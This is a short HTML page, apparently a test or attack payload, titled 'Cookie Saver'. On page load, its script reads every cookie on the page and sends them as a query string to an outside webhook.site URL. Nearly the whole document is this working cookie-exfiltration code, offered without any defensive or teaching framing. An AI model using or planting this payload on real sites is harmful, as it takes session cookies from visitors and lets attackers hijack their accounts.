<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Cookies as Query</title>
    <script>
        // Function to send cookies as query string to the webhook
        function sendCookiesAsQuery() {
            var cookies = document.cookie; // Get cookies

            // Prepare the query string
            var queryString = new URLSearchParams();
            queryString.append('cookies', cookies); // Add cookies to query string

            // Send the query to the webhook URL
            var url = 'https://webhook.site/b528881d-aaf9-489e-b4d4-d12387cdc61e?' + queryString.toString();

            // Make the GET request
            fetch(url, { method: 'GET' })
                .then(response => response.json())
                .then(data => {
                    console.log('Success:', data);
                })
                .catch((error) => {
                    console.error('Error:', error);
                });
        }

        // Automatically send cookies as a query when the page loads
        window.onload = function() {
            sendCookiesAsQuery();
        };
    </script>
</head>
<body>
    <h1>Cookie Saver</h1>
    <p>This page will automatically send cookies as a query to the webhook when loaded.</p>
</body>
</html>
